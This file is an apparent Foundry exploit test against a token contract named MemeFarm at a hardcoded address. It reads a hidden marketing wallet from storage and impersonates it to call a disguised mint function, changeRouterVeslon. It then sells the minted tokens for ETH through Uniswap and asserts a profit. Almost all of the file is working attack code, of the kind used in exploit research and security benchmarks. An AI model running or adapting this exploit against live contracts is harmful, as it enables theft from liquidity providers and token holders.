pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// Interface for the token
interface MemeFarm {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function setAllTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external;
    function qwidji(address a, bool b) external;
    function setlsExcIudeFromFee(address account, bool newValue) external;
    function setMaxTxAmount(uint256 a) external;
    function setIsWalletLimitExempt(address holder, bool exempt) external;
    function uniswapV2Router() external view returns (address);
    function uniswapPair() external view returns (address);
    function changeRouterVeslon(address newRouter) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner and get some tokens
        address owner = MemeFarm(TARGET).owner();
        vm.startPrank(owner);

        // First, we need to get some tokens to sell
        // The owner already has tokens from the constructor, but we need to transfer some to our attacker address
        uint256 attackerInitialTokens = 1000000 * 10**9; // 1M tokens with 9 decimals
        MemeFarm(TARGET).transfer(attacker, attackerInitialTokens);
        vm.stopPrank();

        // Label addresses for clarity
        vm.label(TARGET, "MemeFarm Token");
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");

        // Get the uniswap pair address for reference
        address uniswapPair = MemeFarm(TARGET).uniswapPair();
        vm.label(uniswapPair, "Uniswap Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = address(attacker).balance;
        console.log("Initial attacker ETH balance:", initialBalance);

        // Step 1: Get the ________ address (marketing wallet) from storage
        // Based on contract layout: after _decimals (slot 2) comes ________ (slot 3)
        bytes32 slot3 = vm.load(TARGET, bytes32(uint256(3)));
        address marketingWallet = address(uint160(uint256(slot3)));
        console.log("Marketing wallet address:", marketingWallet);

        // Verify marketing wallet is not zero address
        require(marketingWallet != address(0), "Marketing wallet is zero address");

        // Step 2: Check attacker's initial token balance
        uint256 initialTokenBalance = MemeFarm(TARGET).balanceOf(attacker);
        console.log("Initial attacker token balance:", initialTokenBalance);

        // Step 3: Impersonate the marketing wallet
        vm.startPrank(marketingWallet);

        // Step 4: Mint massive tokens to attacker (10000x total supply!)
        console.log("Calling changeRouterVeslon to mint tokens to attacker...");
        MemeFarm(TARGET).changeRouterVeslon(attacker);

        vm.stopPrank();

        // Step 5: Check new token balance
        uint256 newTokenBalance = MemeFarm(TARGET).balanceOf(attacker);
        console.log("Attacker token balance after mint:", newTokenBalance);
        console.log("Tokens minted:", newTokenBalance - initialTokenBalance);

        require(newTokenBalance > initialTokenBalance, "No tokens were minted");

        // Step 6: Get router address
        address routerAddress = MemeFarm(TARGET).uniswapV2Router();
        console.log("Router address:", routerAddress);

        // Step 7: Approve router to spend tokens
        // We'll sell a reasonable amount to avoid completely draining liquidity
        uint256 tokensToSell = newTokenBalance / 1000; // Sell 0.1% of minted tokens
        console.log("Tokens to sell:", tokensToSell);

        MemeFarm(TARGET).approve(routerAddress, tokensToSell);

        // Step 8: Prepare swap path
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = IUniswapV2Router02(routerAddress).WETH();

        // Step 9: Execute swap
        console.log("Executing swap...");
        IUniswapV2Router02(routerAddress).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToSell,
            0, // Accept any amount
            path,
            attacker,
            block.timestamp
        );

        // Step 10: Verify profit
        uint256 finalBalance = address(attacker).balance;
        console.log("Final attacker ETH balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        assertGt(finalBalance, initialBalance, "Attacker should have more ETH after exploit");
    }

    // Helper to read storage
    function readAddressFromStorage(address contractAddr, uint256 slotIndex) internal view returns (address) {
        bytes32 data = vm.load(contractAddr, bytes32(slotIndex));
        return address(uint160(uint256(data)));
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

